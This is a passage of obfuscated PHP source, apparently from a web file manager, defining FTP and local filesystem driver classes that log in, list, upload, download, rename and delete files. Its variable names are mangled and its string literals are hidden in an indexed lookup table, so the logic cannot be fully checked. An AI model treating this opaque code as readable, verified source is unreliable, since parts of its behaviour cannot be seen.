$Û¶ÓÍÑ˜[12], $Û¶ÓÍÑ˜[1322] => $ì‰í˜², $Û¶ÓÍÑ˜[1326] => $ƒ‚À«ûƒ, $Û¶ÓÍÑ˜[1330] => $™óò™Î, $Û¶ÓÍÑ˜[1367] => $áÜŠù¦Ï, $Û¶ÓÍÑ˜[1368] => $ıöæÊ¨Î, $Û¶ÓÍÑ˜[1369] => $ó“Ğßà, $Û¶ÓÍÑ˜[1370] => $ôİÖĞÛ, $Û¶ÓÍÑ˜[1371] => $Šˆµè´æ, $Û¶ÓÍÑ˜[181] => $this->getHost()); return $ˆÇûÆÂ‚; } } goto b›ˆÉàÌ”İ; b›ˆÉàÌ”İ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($¸’¥Ì°ó) { parent::__construct(); if (count($¸’¥Ì°ó) > 0) { $this->_init($¸’¥Ì°ó); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÚàÑé˜¾) { $ùèööÕñ =& $_SERVER[™¾ÇÙ¯¹]; global $config; $this->appCharset = $config[$ùèööÕñ[1372]]; $this->systemCharset = $config[$ùèööÕñ[1373]]; if (isset($ÚàÑé˜¾[$ùèööÕñ[1374]]) && $ÚàÑé˜¾[$ùèööÕñ[1374]]) { $this->systemCharset = $ÚàÑé˜¾[$ùèööÕñ[1374]]; } } public function iconvApp($ŸÉÜ’µÌ) { return $this->iconvTo($ŸÉÜ’µÌ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ù¾š’éƒ) { return $this->iconvTo($Ù¾š’éƒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($·„ëİ Ú) { $úº ñÑØ =& $_SERVER[™¾ÇÙ¯¹]; $’Ö«èÌ = $this->iconvApp($this->pathBase); $·„ëİ Ú = $this->iconvApp($·„ëİ Ú); if (substr($’Ö«èÌ, 0, 2) == $úº ñÑØ[1375]) { $’Ö«èÌ = BASIC_PATH . substr($’Ö«èÌ, 2); } if (substr($·„ëİ Ú, 0, 2) == $úº ñÑØ[1375]) { $·„ëİ Ú = BASIC_PATH . substr($·„ëİ Ú, 2); } $’Ö«èÌ = KodIO::clear($’Ö«èÌ); $·„ëİ Ú = KodIO::clear($·„ëİ Ú); $·„ëİ Ú = substr($·„ëİ Ú, strlen($’Ö«èÌ)); if (empty($this->pathDriver)) { return $·„ëİ Ú; } return $this->pathDriver . $úº ñÑØ[8] . ltrim($·„ëİ Ú, $úº ñÑØ[8]); } private function _init($¶“Áéª¸ = array()) { $©…–¬Ô =& $_SERVER[™¾ÇÙ¯¹]; if (!function_exists($©…–¬Ô[1376])) { throw new Exception(LNG($©…–¬Ô[1377])); } $this->config = $¶“Áéª¸; $this->charsetReset($¶“Áéª¸); foreach ($¶“Áéª¸ as $ûßŒö˜ä => $˜©Â¥÷î) { if (isset($this->{$ûßŒö˜ä})) { $this->{$ûßŒö˜ä} = $˜©Â¥÷î; } } return $this->_login($¶“Áéª¸); } private function _login($­¼Á¸˜—) { $•ŸÆàüñ =& $_SERVER[™¾ÇÙ¯¹]; static $Áš³¨Ì = array(); $†ß„ã¡œ = md5(json_encode($­¼Á¸˜—)); if (isset($Áš³¨Ì[$†ß„ã¡œ])) { foreach ($Áš³¨Ì[$†ß„ã¡œ] as $ÒÑÆ¬Ğƒ => $àú‚»çµ) { $this->{$ÒÑÆ¬Ğƒ} = $àú‚»çµ; } return !0; } $ºò¶„ı· = parse_url(trim($this->server, $•ŸÆàüñ[8])); $this->host = $ºò¶„ı·[$•ŸÆàüñ[181]]; $¶Ûø² = isset($ºò¶„ı·[$•ŸÆàüñ[180]]) && $ºò¶„ı·[$•ŸÆàüñ[180]] == $•ŸÆàüñ[1378] ? !0 : !1; $this->scheme = $¶Ûø² ? $•ŸÆàüñ[1379] : $•ŸÆàüñ[1380]; $this->port = isset($ºò¶„ı·[$•ŸÆàüñ[182]]) ? $ºò¶„ı·[$•ŸÆàüñ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $•è›ä = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ÇëÁã·¡ = $this->pasv == $•ŸÆàüñ[88] ? !0 : !1; @ftp_pasv($this->connect, $ÇëÁã·¡); $Áš³¨Ì[$†ß„ã¡œ] = array($•ŸÆàüñ[1381] => $this->connect, $•ŸÆàüñ[181] => $this->host, $•ŸÆàüñ[180] => $this->scheme, $•ŸÆàüñ[182] => $this->port); return $•è›ä; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($—ïÒîñ», $™©à™Ò = '', $õæÖ¬ó = REPEAT_RENAME) { if ($this->setContent($—ïÒîñ», $™©à™Ò)) { return $this->getPathOuter($—ïÒîñ»); } return !1; } public function mkdir($¶®Äù÷Ó, $ÌËÁÙÓ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¶®Äù÷Ó = $this->iconvSystem($¶®Äù÷Ó); if ($this->_isFolder($¶®Äù÷Ó) || @ftp_mkdir($this->connect, $¶®Äù÷Ó)) { return $this->getPathOuter($¶®Äù÷Ó); } if (!$this->mkdir($this->pathFather($¶®Äù÷Ó))) { return !1; } if ($¶®Äù÷Ó = @ftp_mkdir($this->connect, $¶®Äù÷Ó)) { return $this->getPathOuter($¶®Äù÷Ó); } return !1; } public function copyFile($”Í±ıêğ, $º»Ê«†Á) { if (!$this->_isconn()) { return !1; } $ˆÃÂÒ³‰ = $this->pathThis($this->iconvSystem($”Í±ıêğ)); $¿Ñ¶Ø³á = $this->tempFile($ˆÃÂÒ³‰); $¢ÌéÆÓú = $this->iconvApp($¿Ñ¶Ø³á); $this->download($”Í±ıêğ, $¢ÌéÆÓú); $ª‰ñ¾±Š = $this->upload($º»Ê«†Á, $¢ÌéÆÓú); $this->tempFileRemve($¿Ñ¶Ø³á); return $ª‰ñ¾±Š; } public function moveFile($áùü«Ş´, $¯ü¸ÜÌÈ) { if (!$this->_isconn()) { return !1; } $áùü«Ş´ = $this->iconvSystem($áùü«Ş´); $¯ü¸ÜÌÈ = $this->iconvSystem($¯ü¸ÜÌÈ); $åÉ¨Û  = @ftp_rename($this->connect, $áùü«Ş´, $¯ü¸ÜÌÈ); return $åÉ¨Û  ? $this->getPathOuter($¯ü¸ÜÌÈ) : !1; } public function delFile($¬ˆ¥éŒö) { if (!$this->_isconn()) { return !1; } $¬ˆ¥éŒö = $this->iconvSystem($¬ˆ¥éŒö); return @ftp_delete($this->connect, $¬ˆ¥éŒö); } public function delFolder($ıÙ…ÖÆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¢ïÎé´¿ = $§‡¼ú½· = array(); $this->fileList($ıÙ…ÖÆ, $¢ïÎé´¿, $§‡¼ú½·, !0); $this->listItemCache = !0; foreach ($§‡¼ú½· as $Úãäš©”) { $ëÆûÕøã = $this->iconvSystem($Úãäš©”[$_SERVER[™¾ÇÙ¯¹][32]]); $˜øœæ…€ = @ftp_delete($this->connect, $ëÆûÕøã); if (!$˜øœæ…€) { return !1; } } foreach ($¢ïÎé´¿ as $ëÆûÕøã) { $ëÆûÕøã = $this->iconvSystem($ëÆûÕøã); $˜øœæ…€ = @ftp_rmdir($this->connect, $ëÆûÕøã); if (!$˜øœæ…€) { return !1; } } $ıÙ…ÖÆ = $this->iconvSystem($ıÙ…ÖÆ); return @ftp_rmdir($this->connect, $ıÙ…ÖÆ); } public function rename($ñåúğé, $‰ø²±®ú) { $„êµ¨Ù =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->_isconn()) { return !1; } $³è‘€’´ = $this->fileNameAuto($this->pathFather($ñåúğé), $‰ø²±®ú); $³è‘€’´ = $this->iconvSystem($³è‘€’´); $ñåúğé = $this->iconvSystem($ñåúğé); $Ç¾–ûØ× = $this->pathFather($ñåúğé); $¯‚û¼›Ú = rtrim($Ç¾–ûØ×, $„êµ¨Ù[8]) . $„êµ¨Ù[8] . $³è‘€’´; $±êİ§Àí = @ftp_rename($this->connect, $ñåúğé, $¯‚û¼›Ú); $¯‚û¼›Ú = $this->iconvApp($¯‚û¼›Ú); return $±êİ§Àí ? $this->getPathOuter($¯‚û¼›Ú) : !1; } private function folderInfo($À–ù ½¸, $¶ë¤Îá¤ = false) { $·§¼Ñ‚Ú =& $_SERVER[™¾ÇÙ¯¹]; $•³áŞı» = array($·§¼Ñ‚Ú[32] => $this->pathThis($À–ù ½¸), $·§¼Ñ‚Ú[84] => $this->getPathOuter($·§¼Ñ‚Ú[8] . $À–ù ½¸), $·§¼Ñ‚Ú[33] => $·§¼Ñ‚Ú[75]); if ($¶ë¤Îá¤) { return $•³áŞı»; } $•³áŞı»[$·§¼Ñ‚Ú[200]] = $•³áŞı»[$·§¼Ñ‚Ú[85]] = 0; $•³áŞı»[$·§¼Ñ‚Ú[201]] = $•³áŞı»[$·§¼Ñ‚Ú[202]] = !0; return $•³áŞı»; } private function fileInfo($õ²ÃÎæ, $†ƒŠ°éš = false, $‚ç‰ì = array()) { $˜×ƒ‹ú÷ =& $_SERVER[™¾ÇÙ¯¹]; $Ã—ÙÀå = array($˜×ƒ‹ú÷[32] => $this->pathThis($õ²ÃÎæ), $˜×ƒ‹ú÷[84] => $this->getPathOuter($˜×ƒ‹ú÷[8] . $õ²ÃÎæ), $˜×ƒ‹ú÷[33] => $˜×ƒ‹ú÷[199], $˜×ƒ‹ú÷[76] => isset($‚ç‰ì[$˜×ƒ‹ú÷[76]]) ? $‚ç‰ì[$˜×ƒ‹ú÷[76]] : 0, $˜×ƒ‹ú÷[174] => $this->ext($õ²ÃÎæ)); if ($†ƒŠ°éš) { return $Ã—ÙÀå; } $Ã—ÙÀå[$˜×ƒ‹ú÷[200]] = $Ã—ÙÀå[$˜×ƒ‹ú÷[85]] = 0; $Ã—ÙÀå[$˜×ƒ‹ú÷[201]] = $Ã—ÙÀå[$˜×ƒ‹ú÷[202]] = !0; $–ìØàü£ = $this->iconvSystem($õ²ÃÎæ); $Ã—ÙÀå[$˜×ƒ‹ú÷[85]] = @ftp_mdtm($this->connect, $–ìØàü£); if (empty($‚ç‰ì)) { $‚ç‰ì = $this->objectMeta($õ²ÃÎæ); if (!$‚ç‰ì) { return $Ã—ÙÀå; } } $Ã—ÙÀå[$˜×ƒ‹ú÷[76]] = $‚ç‰ì[$˜×ƒ‹ú÷[76]]; return $Ã—ÙÀå; } public function size($ï—ƒ¶´) { $«†§„ = $this->objectMeta($ï—ƒ¶´); return $«†§„ ? $«†§„[$_SERVER[™¾ÇÙ¯¹][76]] : 0; } public function info($íÉÙƒá‘) { if ($this->isFile($íÉÙƒá‘)) { return $this->fileInfo($íÉÙƒá‘, 0); } else { if ($this->isFolder($íÉÙƒá‘)) { return $this->folderInfo($íÉÙƒá‘); } } return !1; } private function fileList($˜¶˜×æ£, &$æóÚ²ï , &$‚¾¢×­˜, $ùÎ‘‹Æ¢ = false) { $¢œô®ÃÕ =& $_SERVER[™¾ÇÙ¯¹]; $˜¶˜×æ£ = $this->iconvSystem($˜¶˜×æ£); if (!$this->isFolder($˜¶˜×æ£)) { return !1; } @ftp_chdir($this->connect, $¢œô®ÃÕ[8]); $˜¶˜×æ£ = rtrim($˜¶˜×æ£, $¢œô®ÃÕ[8]) . $¢œô®ÃÕ[8]; check_abort(); $äË•†Íğ = @ftp_rawlist($this->connect, $˜¶˜×æ£); if (!$äË•†Íğ) { $äË•†Íğ = array(); } $Á’…üÜ = array($¢œô®ÃÕ[10] => 1, $¢œô®ÃÕ[1382] => 1); foreach ($äË•†Íğ as $üèú––×) { $ÃÇ£Í¶­ = $this->_listItem($üèú––×); if ($ÃÇ£Í¶­[0] == $¢œô®ÃÕ[774]) { continue; } $ŸÛğÓ÷ = $ÃÇ£Í¶­[8]; if (empty($ŸÛğÓ÷) && $ŸÛğÓ÷ !== $¢œô®ÃÕ[197] || isset($Á’…üÜ[$ŸÛğÓ÷])) { continue; } $ŸÛğÓ÷ = $this->iconvApp($˜¶˜×æ£ . ltrim($ŸÛğÓ÷, $¢œô®ÃÕ[8])); $Åó»õÓÑ = array($¢œô®ÃÕ[32] => $ŸÛğÓ÷, $¢œô®ÃÕ[33] => $¢œô®ÃÕ[199], $¢œô®ÃÕ[76] => $ÃÇ£Í¶­[4]); if (substr($üèú––×, 0, 1) == $¢œô®ÃÕ[1383]) { $Åó»õÓÑ[$¢œô®ÃÕ[33]] = $¢œô®ÃÕ[75]; $Åó»õÓÑ[$¢œô®ÃÕ[76]] = 0; } $‹ßÓ£æÂ = $Åó»õÓÑ[$¢œô®ÃÕ[33]] == $¢œô®ÃÕ[75] ? !0 : !1; $this->cacheMethodInfoSet($ŸÛğÓ÷, $‹ßÓ£æÂ, $Åó»õÓÑ); if ($‹ßÓ£æÂ) { $æóÚ²ï [] = $ŸÛğÓ÷; if ($ùÎ‘‹Æ¢) { $this->fileList($ŸÛğÓ÷, $æóÚ²ï , $‚¾¢×­˜, $ùÎ‘‹Æ¢); } continue; } $‚¾¢×­˜[] = $Åó»õÓÑ; } $this->cacheMethodInfoSet($˜¶˜×æ£, !0); } private function _listItem($‰ÏØ¢á) { if (empty($‰ÏØ¢á)) { return array(); } $Å‘É§¼ƒ = preg_split($_SERVER[™¾ÇÙ¯¹][1384], $‰ÏØ¢á); if (count($Å‘É§¼ƒ) <= 9) { return $Å‘É§¼ƒ; } $Å‘É§¼ƒ[8] = trim(substr($‰ÏØ¢á, strpos($‰ÏØ¢á, $Å‘É§¼ƒ[7]) + strlen($Å‘É§¼ƒ[7]))); return array_splice($Å‘É§¼ƒ, 0, 9); } public function listPath($šúôÜÏ , $çÛ“¸Ï = false) { $¶´å°Œ‰ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->_isconn()) { return !1; } $Ô»ØÈ„· = $¿şĞñ³Ë = array(); $this->fileList($šúôÜÏ , $Ô»ØÈ„·, $¿şĞñ³Ë); foreach ($Ô»ØÈ„· as $ ³ĞñĞ¦ => $ªì¼ûŒ§) { $Ô»ØÈ„·[$ ³ĞñĞ¦] = $this->folderInfo($ªì¼ûŒ§, $çÛ“¸Ï); } foreach ($¿şĞñ³Ë as $ ³ĞñĞ¦ => $ªì¼ûŒ§) { $¿şĞñ³Ë[$ ³ĞñĞ¦] = $this->fileInfo($ªì¼ûŒ§[$¶´å°Œ‰[32]], $çÛ“¸Ï, $ªì¼ûŒ§); } return array($¶´å°Œ‰[82] => $Ô»ØÈ„·, $¶´å°Œ‰[83] => $¿şĞñ³Ë); } public function has($ÉŒ°Œ©‘, $óÉµØ³ˆ = false, $×—É×” = true) { $õˆÂâ†û =& $_SERVER[™¾ÇÙ¯¹]; $¸•¾… = $ğŞ¯ì§ã = array(); $¯Ø¼À´³ = $óÉµØ³ˆ ? !0 : !1; $this->fileList($ÉŒ°Œ©‘, $¸•¾…, $ğŞ¯ì§ã, $¯Ø¼À´³); if ($óÉµØ³ˆ) { return array($õˆÂâ†û[207] => count($ğŞ¯ì§ã), $õˆÂâ†û[208] => count($¸•¾…)); } if ($×—É×”) { if (count($ğŞ¯ì§ã)) { return !0; } } else { if (count($¸•¾…)) { return !0; } } return !1; } public function listAll($†®…À†») { $ÓÇÆêë =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->_isconn()) { return !1; } $¶ñ‡Æ¾ı = $µ£ê•‰Ç = array(); $this->fileList($†®…À†», $¶ñ‡Æ¾ı, $µ£ê•‰Ç, !0); $éƒœõÑë = array(); foreach ($µ£ê•‰Ç as $ù•áí®Ò) { $éƒœõÑë[$ù•áí®Ò[$ÓÇÆêë[32]]] = $ù•áí®Ò[$ÓÇÆêë[76]]; } foreach ($¶ñ‡Æ¾ı as $ù•áí®Ò) { if (is_string($ù•áí®Ò)) { $éƒœõÑë[$ù•áí®Ò] = 0; } } return $this->listAllFiles($†®…À†», array_keys($éƒœõÑë), $éƒœõÑë); } public function getContent($‚¿—¨Û×) { if (!$this->_isconn()) { return !1; } $‚¿—¨Û× = $this->iconvSystem($‚¿—¨Û×); return $this->fileSubstr($‚¿—¨Û×); } public function setContent($îëúÏÎò, $°‚ĞÑ²³ = '') { if (!$this->_isconn()) { return !1; } $®îôÇï = $this->pathThis($this->iconvSystem($îëúÏÎò)); $Ø˜òŠŸ• = $this->tempFile($®îôÇï); file_put_contents($Ø˜òŠŸ•, $°‚ĞÑ²³); $çõë¸®ò = $this->upload($îëúÏÎò, $this->iconvApp($Ø˜òŠŸ•)); $this->tempFileRemve($Ø˜òŠŸ•); return $çõë¸®ò; } public function fileSubstr($®ªî«›, $²‘Ğ±ú‹ = 0, $Ë«¹üâä = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($®ªî«›, $²‘Ğ±ú‹, $Ë«¹üâä); } private function ftpRequest($«¥ç¦ı, $°÷Š†ÑÌ = 0, $¥Ôõ‰Ñî = false) { $«¥ç¦ı = $this->iconvSystem($«¥ç¦ı); $æš‚¢ü“ = $this->scheme . $this->host . $_SERVER[™¾ÇÙ¯¹][4] . $this->port; $É–ğŸöî = curl_init(); curl_setopt($É–ğŸöî, CURLOPT_URL, $æš‚¢ü“ . $this->pathEncode($«¥ç¦ı)); curl_setopt($É–ğŸöî, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¥Ôõ‰Ñî) { $Ï‹ ëÑ = $°÷Š†ÑÌ + $¥Ôõ‰Ñî - 1; curl_setopt($É–ğŸöî, CURLOPT_RANGE, "{$°÷Š†ÑÌ}\55{$Ï‹ ëÑ}"); } curl_setopt($É–ğŸöî, CURLOPT_RETURNTRANSFER, 1); $³¯¡™óâ = curl_exec($É–ğŸöî); curl_close($É–ğŸöî); return $³¯¡™óâ; } public function upload($§ĞÍÆ§, $íŸüûÂ„, $ ºµ÷î¿ = false, $æÊĞ‹ı = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($§ĞÍÆ§))) { return !1; } $§ĞÍÆ§ = $this->iconvSystem($§ĞÍÆ§); $íŸüûÂ„ = $this->iconvSystem($íŸüûÂ„); $œàÜß”ğ = ftp_nb_put($this->connect, $§ĞÍÆ§, $íŸüûÂ„, FTP_BINARY); while ($œàÜß”ğ == FTP_MOREDATA) { $œàÜß”ğ = ftp_nb_continue($this->connect); } if ($œàÜß”ğ != FTP_FINISHED) { return !1; } return $this->getPathOuter($§ĞÍÆ§); } public function download($¯’Ğ¡Ó‰, $—ÃúÔñ¹ = '') { if (!$this->_isconn()) { return !1; } $Úòó£Í³ = $this->pathFather($—ÃúÔñ¹); if (!IO::mkdir($Úòó£Í³)) { return !1; } $¯’Ğ¡Ó‰ = $this->iconvSystem($¯’Ğ¡Ó‰); $—ÃúÔñ¹ = $this->iconvSystem($—ÃúÔñ¹); $ˆ‹ˆ˜Ûó = ftp_nb_get($this->connect, $—ÃúÔñ¹, $¯’Ğ¡Ó‰, FTP_BINARY); while ($ˆ‹ˆ˜Ûó == FTP_MOREDATA) { $ˆ‹ˆ˜Ûó = ftp_nb_continue($this->connect); } if ($ˆ‹ˆ˜Ûó != FTP_FINISHED) { return !1; } return $this->iconvApp($—ÃúÔñ¹); } public function exist($…×‹Ä°) { return $this->isFile($…×‹Ä°) || $this->isFolder($…×‹Ä°); } public function isFile($‡³£…«ë) { return !$this->isFolder($‡³£…«ë) && $this->objectMeta($‡³£…«ë); } public function isFolder($êæéÚä) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][165], $êæéÚä); } protected function objectMeta($€ Ô¸öí) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][167], $€ Ô¸öí); } protected function _objectMeta($Ü˜–Èğõ) { $Ú…åŸ¥ =& $_SERVER[™¾ÇÙ¯¹]; if ($Ü˜–Èğõ == $Ú…åŸ¥[12] || $Ü˜–Èğõ == $Ú…åŸ¥[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ü˜–Èğõ = $this->iconvSystem($Ü˜–Èğõ); $âï”ª¸á = array($Ú…åŸ¥[32] => $this->iconvApp($Ü˜–Èğõ), $Ú…åŸ¥[33] => $Ú…åŸ¥[199], $Ú…åŸ¥[76] => 0); @ftp_chdir($this->connect, $Ú…åŸ¥[8]); $Úö¸ÄõË = @ftp_size($this->connect, $Ü˜–Èğõ); if ($Úö¸ÄõË != -1) { $âï”ª¸á[$Ú…åŸ¥[76]] = $Úö¸ÄõË; } else { $ŠòšÏïÌ = @ftp_chdir($this->connect, $Ü˜–Èğõ); if (!$ŠòšÏïÌ) { return !1; } $âï”ª¸á[$Ú…åŸ¥[33]] = $Ú…åŸ¥[75]; } return $âï”ª¸á; } protected function _isFolder($ÎªŠñ¿¶) { $œ¼·§…— =& $_SERVER[™¾ÇÙ¯¹]; if ($ÎªŠñ¿¶ == $œ¼·§…—[12] || $ÎªŠñ¿¶ == $œ¼·§…—[8]) { return !0; } $©³€—·ó = $this->_objectMeta($ÎªŠñ¿¶); return isset($©³€—·ó[$œ¼·§…—[33]]) && $©³€—·ó[$œ¼·§…—[33]] == $œ¼·§…—[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ƒ¯ÎíŠü) { if (substr($ƒ¯ÎíŠü, 0, 2) == $_SERVER[™¾ÇÙ¯¹][1375]) { $ƒ¯ÎíŠü = BASIC_PATH . substr($ƒ¯ÎíŠü, 2); } return $ƒ¯ÎíŠü; } public function iconvApp($™¬íß…Ü) { $±«É¸¸ú =& $_SERVER[™¾ÇÙ¯¹]; global $config; return $this->iconvTo($™¬íß…Ü, $config[$±«É¸¸ú[1373]], $config[$±«É¸¸ú[1372]]); } public function iconvSystem($İÀÊÒÛ°) { $²–Ê ÙÙ =& $_SERVER[™¾ÇÙ¯¹]; global $config; return $this->iconvTo($İÀÊÒÛ°, $config[$²–Ê ÙÙ[1372]], $config[$²–Ê ÙÙ[1373]]); } public function getPathOuter($£æ‹Ôì‘) { $¯íóŞº° =& $_SERVER[™¾ÇÙ¯¹]; $Õò†Ñ¶ˆ = $this->iconvApp($this->pathBase); $£æ‹Ôì‘ = $this->iconvApp($£æ‹Ôì‘); if (substr($Õò†Ñ¶ˆ, 0, 2) == $¯íóŞº°[1375]) { $Õò†Ñ¶ˆ = BASIC_PATH . substr($Õò†Ñ¶ˆ, 2); } if (substr($£æ‹Ôì‘, 0, 2) == $¯íóŞº°[1375]) { $£æ‹Ôì‘ = BASIC_PATH . substr($£æ‹Ôì‘, 2); } $Õò†Ñ¶ˆ = KodIO::clear($Õò†Ñ¶ˆ); $£æ‹Ôì‘ = KodIO::clear($£æ‹Ôì‘); $£æ‹Ôì‘ = substr($£æ‹Ôì‘, strlen($Õò†Ñ¶ˆ)); if (empty($this->pathDriver)) { return $£æ‹Ôì‘; } return $this->pathDriver . $¯íóŞº°[8] . ltrim($£æ‹Ôì‘, $¯íóŞº°[8]); } public function mkfile($Üè´øŒ, $´ç–­ = '', $èÖ¨˜„ú = REPEAT_RENAME) { $Üè´øŒ = $this->iconvSystem($Üè´øŒ); @touch($Üè´øŒ); if ($´ç–­) { file_put_contents($Üè´øŒ, $´ç–­); } @chmod($Üè´øŒ, $this->pathAuth); return is_file($Üè´øŒ) ? $this->getPathOuter($Üè´øŒ) : !1; } public function mkdir($ùÏ´àÜ, $üÖ»‡üö = REPEAT_SKIP) { $ùÏ´àÜ = $this->iconvSystem($ùÏ´àÜ); if (is_dir($ùÏ´àÜ)) { return $this->getPathOuter($ùÏ´àÜ); } @mkdir($ùÏ´àÜ, $this->pathAuth, !0); @chmod($ùÏ´àÜ, $this->pathAuth); return is_dir($ùÏ´àÜ) ? $this->getPathOuter($ùÏ´àÜ) : !1; } public function copyFile($¡‰áÏ, $ñœµ´¢) { $this->mkdir($this->pathFather($ñœµ´¢)); $¡‰áÏ = $this->iconvSystem($¡‰áÏ); $ñœµ´¢ = $this->iconvSystem($ñœµ´¢); $èšù¬ÔÎ = copy_64($¡‰áÏ, $ñœµ´¢); @chmod($ñœµ´¢, $this->pathAuth); return $èšù¬ÔÎ ? $this->getPathOuter($ñœµ´¢) : !1; } public function moveFile($ºÊÎÕ€Ã, $¤ƒ‚Ô•Ó) { $this->mkdir($this->pathFather($¤ƒ‚Ô•Ó)); $ºÊÎÕ€Ã = $this->iconvSystem($ºÊÎÕ€Ã); $¤ƒ‚Ô•Ó = $this->iconvSystem($¤ƒ‚Ô•Ó); $Ç­î®ö = intval(@rename($ºÊÎÕ€Ã, $¤ƒ‚Ô•Ó)); if (!$Ç­î®ö) { if ($Ç­î®ö = intval(@copy_64($ºÊÎÕ€Ã, $¤ƒ‚Ô•Ó))) { @unlink($ºÊÎÕ€Ã); } } @chmod($¤ƒ‚Ô•Ó, $this->pathAuth); return $Ç­î®ö ? $this->getPathOuter($¤ƒ‚Ô•Ó) : !1; } public function movePath($èĞ–àÛø, $Î‹êôÂï, $ÍìÍ¯ÃÛ = false) { $Â·Úª· =& $_SERVER[™¾ÇÙ¯¹]; $èĞ–àÛø = $this->iconvSystem($èĞ–àÛø); $Î‹êôÂï = $this->iconvSystem($Î‹êôÂï); $†…ø„ıÄ = rtrim($Î‹êôÂï, $Â·Úª·[8]) . $Â·Úª·[8] . ($ÍìÍ¯ÃÛ ? $ÍìÍ¯ÃÛ : get_path_this($èĞ–àÛø)); if (file_exists($†…ø„ıÄ)) { return !1; } $—Ş˜ãô¶ = intval(@rename($èĞ–àÛø, $†…ø„ıÄ)); $—Ş˜ãô¶ = file_exists($†…ø„ıÄ); return $—Ş˜ãô¶ ? $this->getPathOuter($†…ø„ıÄ) : !1; } public function delFile($Æ¤µëÁ’) { $Æ¤µëÁ’ = $this->iconvSystem($Æ¤µëÁ’); if (!@unlink($Æ¤µëÁ’)) { @chmod($Æ¤µëÁ’, $this->pathAuth); if (!@unlink($Æ¤µëÁ’)) { return !1; } } else { return !0; } } public function delFolder($¸Õè®ùÅ) { $º‡½´¥º =& $_SERVER[™¾ÇÙ¯¹]; $¸Õè®ùÅ = $this->iconvSystem($¸Õè®ùÅ); if (!is_dir($¸Õè®ùÅ)) { return !0; } if (!($Ç¢¶ÅÈµ = opendir($¸Õè®ùÅ))) { return !1; } while (($¶÷‘Êé = readdir($Ç¢¶ÅÈµ)) !== !1) { if ($¶÷‘Êé == $º‡½´¥º[10] || $¶÷‘Êé == $º‡½´¥º[1382]) { continue; } $„ºò°­ = $¸Õè®ùÅ . $º‡½´¥º[8] . $¶÷‘Êé; if (is_file($„ºò°­) || is_link($„ºò°­)) { if (!unlink($„ºò°­)) { chmod($„ºò°­, $this->pathAuth); if (!unlink($„ºò°­)) { return !1; } } } else { if (is_dir($„ºò°­)) { chmod($„ºò°­, $this->pathAuth); $„ºò°­ = $this->iconvApp($„ºò°­); if (!$this->delFolder($„ºò°­)) { return !1; } } } } closedir($Ç¢¶ÅÈµ); return rmdir($¸Õè®ùÅ); } public function rename($¾İ¨ºõË, $ˆ¤©º„µ) { $ÎÁ’óû =& $_SERVER[™¾ÇÙ¯¹]; $Í˜ŒĞÀ = $this->fileNameAuto($this->pathFather($¾İ¨ºõË), $ˆ¤©º„µ); $Í˜ŒĞÀ = $this->iconvSystem($Í˜ŒĞÀ); $¾İ¨ºõË = $this->iconvSystem($¾İ¨ºõË); $Ü´¦¡•è = $this->pathFather($¾İ¨ºõË); $œòŒ ˜ = rtrim($Ü´¦¡•è, $ÎÁ’óû[8]) . $ÎÁ’óû[8] . $Í˜ŒĞÀ; $êİ°¨ÂÏ = @rename($¾İ¨ºõË, $œòŒ ˜); $œòŒ ˜ = $this->iconvApp($œòŒ ˜); return $êİ°¨ÂÏ ? $this->getPathOuter($œòŒ ˜) : !1; } public function size($·Å¿ì®ß) { $·Å¿ì®ß = $this->iconvSystem($·Å¿ì®ß); return filesize_64($·Å¿ì®ß); } public function info($ëÏ³åÜ) { $ëÏ³åÜ = $this->iconvSystem($ëÏ³åÜ); if ($this->isFolder($ëÏ³åÜ)) { return $this->folderInfo($ëÏ³åÜ); } else { if ($this->isFile($ëÏ³åÜ)) { return $this->fileInfo($ëÏ³åÜ); } } return !1; } protected function infoChildren($í»Û”¼, &$ş¡˜Ù¢£, $¤‚Ôç¹‚ = true) { $®Í²áï =& $_SERVER[™¾ÇÙ¯¹]; check_abort_echo(); $í»Û”¼ = rtrim($í»Û”¼, $®Í²áï[8]) . $®Í²áï[8]; if ($¤‚Ôç¹‚) { $í»Û”¼ = $this->iconvSystem($í»Û”¼); } if (!($ûóÕ±É› = @opendir($í»Û”¼))) { return; } while (($èßŠú   = readdir($ûóÕ±É›)) !== !1) { if ($èßŠú   == $®Í²áï[10] || $èßŠú   == $®Í²áï[1382]) { continue; } $‚ìï×˜Õ = $í»Û”¼ . $èßŠú  ; if (is_file($‚ìï×˜Õ) || is_link($‚ìï×˜Õ)) { $ş¡˜Ù¢£[$®Í²áï[77]]++; $ş¡˜Ù¢£[$®Í²áï[76]] += filesize_64($‚ìï×˜Õ); } else { if (is_dir($‚ìï×˜Õ)) { $ş¡˜Ù¢£[$®Í²áï[78]]++; $this->infoChildren($‚ìï×˜Õ, $ş¡˜Ù¢£, !1); } } } closedir($ûóÕ±É›); } private function folderInfo($…ÒÙÒÏ, $ÏîÊŒ¥¶ = false) { $­ä£½ş =& $_SERVER[™¾ÇÙ¯¹]; $…ÒÙÒÏ = rtrim($…ÒÙÒÏ, $­ä£½ş[8]) . $­ä£½ş[8]; $Šø¿ŒŸË = $this->iconvApp($this->pathThis($…ÒÙÒÏ)); if 